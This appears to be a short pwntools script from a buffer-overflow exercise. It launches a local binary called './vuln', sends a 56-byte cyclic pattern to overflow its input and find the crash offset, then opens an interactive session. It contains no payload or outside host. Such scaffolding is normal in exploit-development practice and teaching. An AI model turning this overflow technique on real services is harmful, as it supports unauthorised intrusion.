from pwn import *
pp = process("./vuln")
pp.sendline(cyclic(56))
pp.interactive()
